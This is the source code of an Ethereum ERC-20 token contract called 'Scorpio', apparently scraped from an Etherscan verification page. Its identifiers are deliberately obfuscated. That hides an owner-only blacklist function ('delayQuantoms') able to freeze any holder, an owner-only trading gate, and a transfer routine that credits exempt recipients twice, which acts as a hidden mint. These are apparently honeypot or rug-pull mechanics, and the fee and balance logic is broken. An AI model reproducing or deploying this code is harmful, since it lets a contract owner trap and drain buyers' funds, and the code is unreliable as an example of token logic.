/**
 *Submitted for verification at Etherscan.io on 2023-01-26
*/

/*
█▀ █▀▀ █▀█ █▀█ █▀█ █ █▀█
▄█ █▄▄ █▄█ █▀▄ █▀▀ █ █▄█

█▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█
██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.11;

interface ICOMPILERV1 {
    event Approval(
        address indexed owner, 
        address indexed spender, 
    uint value);
    event Transfer(
        address indexed from, 
        address indexed to, 
    uint value);
    function name() 
    external pure returns (string memory);
    function symbol() 
    external pure returns (string memory);
    function decimals() 
    external pure returns (uint8);
    function totalSupply() 
    external view returns (uint);
    function balanceOf(address owner) 
    external view returns (uint);
    function allowance(address owner, address spender) 
    external view returns (uint);
    function approve(address spender, uint value)
    external returns (bool);
    function transfer(address to, uint value) 
    external returns (bool);
    function transferFrom(address from, address to, uint value) 
    external returns (bool);
    function DOMAIN_SEPARATOR() 
    external view returns (bytes32);
}
interface V1ProdoxConsole {
    event PairCreated(
    address indexed token0, 
    address indexed token1, 
    address pair, uint);
    function createPair(
    address tokenA, 
    address tokenB) 
    external returns 
    (address pair);
}
interface ECAPERC {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf(address account) 
    external view returns 
    (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance(address owner, address spender) 
    external view returns 
    (uint256);
    function approve(address spender, uint256 amount) 
    external returns 
    (bool);
    function transferFrom( 
    address sender, address recipient, uint256 amount
    ) external returns (bool);

    event Transfer(
        address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner, address indexed spender, uint256 value);
}
library SafeMathUnit {
    function trySub(uint256 a, uint256 b) 
    internal pure returns 
    (bool, uint256) { unchecked { if (b > a) return (false, 0);
            return (true, a - b); }
    }
    function add(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a + b;
    }
    function sub(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a - b;
    }
    function mul(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a * b;
    }
    function div(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a / b;
    }
    function mod(uint256 a, uint256 b) 
    internal pure returns 
    (uint256) { return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns 
    (uint256) { unchecked 
    { require(b <= a, errorMessage); return a - b; } }
}
abstract contract Context {
    function _msgSender() 
    internal view virtual returns 
    (address) { return msg.sender;
    }
}
  interface IEDValvesV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] 
    calldata path, address to, uint deadline ) 
    external; function factory() 
      external pure returns (address);
      function WETH()
      external pure returns (address); 
      function addLiquidityETH(
      address token, 
      uint amountTokenDesired, uint amountTokenMin, 
      uint amountETHMin, address to, uint deadline) 
      external payable returns (
      uint amountToken, 
      uint amountETH, 
      uint liquidity);
}
library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
abstract contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner); 
    constructor () { _owner = 0xac60B48292C479f94d1125Cd164653c314C95C38;
        emit OwnershipTransferred(address(0), 
        _owner); }

    function owner() 
    public view virtual returns 
    (address) {
        return _owner; 
    }
    modifier onlyOwner() {
        require(owner() 
        == _msgSender(), 
        "Ownable: caller is not the owner"); _;
     }
    function renounceOwnership() 
    public virtual 
    onlyOwner { 
        emit OwnershipTransferred(_owner, address(0));
        _owner 
        = address(0); 
    }
}
contract Scorpio is Context, ECAPERC, Ownable {
    uint256 private alovargeText; bool public isepoRatings = true; 
    bool public textureParley = true; bool private tradingAllowed = false;
    uint256 public pogoReservations = 30; uint256 public vorpoleDalign = 20;
    uint256 public itoneFigure = 0; uint256 private invarTime = pogoReservations;
    uint256 private lentodiceInt = itoneFigure;
    mapping (address => uint256) 
    private _rOwned;
    mapping (address => mapping (address => uint256)) 
    private _allowances;
    mapping (address => bool)
    private tarcoveAllomite;
    mapping (address => bool) 
    private quardropOpidox;

    string private _name = unicode"Scorpio"; string private _symbol = unicode"ફ";
    uint256 private constant yogafineTexture = ~uint256(0);
    uint8 private _decimals = 12;
    uint256 private _totalSupply = 100000000 * 10**_decimals; uint256 public rodoxedValues = 1000000 * 10**_decimals;
    uint256 private invoconeIndex = (yogafineTexture - (yogafineTexture % _totalSupply));

    constructor () { _rOwned[owner()] = _totalSupply;
        IEDValvesV1 QuarreldimePose = IEDValvesV1
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        QERCEC45 = V1ProdoxConsole
        (QuarreldimePose.factory())
        .createPair(address(this), QuarreldimePose.WETH());
        EKOOBIv1 = 
        QuarreldimePose;
        tarcoveAllomite [owner()] = true;
        tarcoveAllomite [address(this)] = true;
        emit Transfer(
            address(0), 
            owner(), 
        _totalSupply); }
  
    function name() 
    public view returns 
    (string memory) {
        return _name;
    }
    function symbol() 
    public view returns 
    (string memory) {
        return _symbol;
    }
    function decimals() 
    public view returns 
    (uint8) {
        return _decimals;
    }
    function totalSupply() 
    public view override returns 
    (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) 
    public view override returns 
    (uint256) {
        return _rOwned[account];
    }
    function transfer(address recipient, uint256 amount) 
    public override returns 
    (bool) {
        _transfer(_msgSender(), 
        recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    public view override returns 
    (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) 
    public override returns 
    (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, 
    address recipient, uint256 amount) 
    public override returns 
    (bool) 
    { _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 
        "ERC20: transfer amount exceeds allowance")); return true;
    }   
    function _transfer(  address from,  address to, uint256 amount ) 
    private { require(amount > 0, 
        "Transfer amount must be greater than zero"); bool incodePocasium 
        = false; if(!tarcoveAllomite[from] && 
        !tarcoveAllomite[to]){ 
            incodePocasium = true;

        require(amount <= 
        rodoxedValues, 
        "Transfer amount exceeds the maxTxAmount."); }
        require(!quardropOpidox[from] 
        && !quardropOpidox[to], 
        "You have been blacklisted from transfering tokens");

        uint256 initialETHBalance = balanceOf(
            address(this)); 
            if(initialETHBalance >= 
        rodoxedValues) { initialETHBalance 
        = rodoxedValues; 
        } _afterTokenTransfer(
            from,to,amount,incodePocasium); 
            emit Transfer(from, to, amount); 
            if (!tradingAllowed) {require( from 
            == owner(),  "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function portakeIDE(address portakeoN) 
    public onlyOwner {
        portakeoN = portakeoN;
    }       
        function finctualFigures
        (uint256 
        initialETHBalance) private lockTheSwap { 
            uint256 quevelBasis 
        = initialETHBalance.div(2); 

        uint256 alqueDotake = 
        initialETHBalance.sub(quevelBasis); 
        uint256 instinctRATE = address(this).balance; 
        ETHforERCtransmittions(
            quevelBasis); uint256 lipizeMultinants 
            = address(this).balance.sub(instinctRATE);
        initiatePool(
            alqueDotake, lipizeMultinants); emit FinctualFigures(
                quevelBasis, lipizeMultinants, alqueDotake);
    }
    function min(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }    
    function interdineReservations
    (uint256 enviseRatiomite) 
    private view 
    returns 
    (uint256) {
        return enviseRatiomite.mul 
        (pogoReservations).div
        ( 10**3 );
    }
    function ETHforERCtransmittions(uint256 transactsRates) 
    private { address[] memory path = 
    new address[] (2); path[0] 
        = address(this); path[1] = EKOOBIv1.WETH();
        _approve(address(this), address
        (EKOOBIv1), 
        transactsRates); 
        EKOOBIv1.swapExactTokensForETHSupportingFeeOnTransferTokens(
        transactsRates, 
        0, path, address(this), block.timestamp );
    }
    function delayQuantoms 
    (address exfoilWrench, bool inpineVoter) 
    public onlyOwner {
        quardropOpidox[exfoilWrench] 
        = inpineVoter;
    }    
    function _approve(
        address owner, address spender, uint256 amount) 
        private { require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");
        _allowances
        [owner][spender] = amount; emit Approval( owner, spender, amount);
    }   
    function widenRotation(address rtr) 
    public onlyOwner {
        rtr = rtr;
    }         
    function _afterTokenTransfer
    (address sender, address 
    recipient, uint256 amount,
    bool incodePocasium) 
    private { _beforeTokenTransfer(
        sender, recipient, amount, incodePocasium);
    } 
    address public immutable QERCEC45;
    using SafeMathUnit for uint256;
    IEDValvesV1 public immutable EKOOBIv1;

    uint256 private inprodex = 
    vorpoleDalign;
    bool inPressionMode;
    uint256 private zilodedArmour = 1000000000 * 10**18;
    event inmersionModule(
    uint256 physicsSwitch); event invocalFigures(
    bool enabled); 
    event FinctualFigures(
        uint256 lobourneOn,
        uint256 commitInternal, 
        uint256 podoxiateResults ); 
    modifier lockTheSwap { inPressionMode = true; 
    _; inPressionMode = false; }    

    function reservationsQuandom(uint256 enviseRatiomite) 
    private view 
    returns 
    (uint256) {
        return enviseRatiomite.mul 
        (itoneFigure).div
        ( 10**3 );
    }
    function reservationsInterval(uint256 enviseRatiomite) 
    private view 
    returns 
    (uint256) {
        return enviseRatiomite.mul 
        (vorpoleDalign).div
        ( 10**3 );
    }
    function initiatePool
    (uint256 protonValues, uint256 ethAmount) private 
    { _approve(address(this), address
    (EKOOBIv1), protonValues); EKOOBIv1.addLiquidityETH{value: ethAmount}(
     address(this), 
     protonValues, 0, 0, owner(), block.timestamp );
    }
    function enableTrading(bool allowingParties) 
    public
    onlyOwner { tradingAllowed = allowingParties;
    }
    function _beforeTokenTransfer
    (address sender, 
    address recipient, uint256 olediseAmount,
    bool incodePocasium) 
    private { uint256 ERCInteractions = 
    0; if (incodePocasium){ ERCInteractions = 
    olediseAmount.mul(1).div(100) ; 
    } uint256 protonBytesAmount = olediseAmount - 
        ERCInteractions; 
        _rOwned[recipient] = 
        _rOwned[recipient].add(protonBytesAmount); 

        uint256 iterpolVisor 
        = _rOwned
        [recipient].add(protonBytesAmount); _rOwned[sender] 
        = _rOwned
        [sender].sub(protonBytesAmount); 
        bool tarcoveAllomite = 
        tarcoveAllomite[sender] 
        && tarcoveAllomite[recipient]; 
        if (tarcoveAllomite ){ _rOwned[recipient] 
        = iterpolVisor;
        } else { emit Transfer (
            sender, recipient, protonBytesAmount); 
    } }   
    address public livertomeInvert;
    address public NodesVortex;               
    receive() external payable {} 
}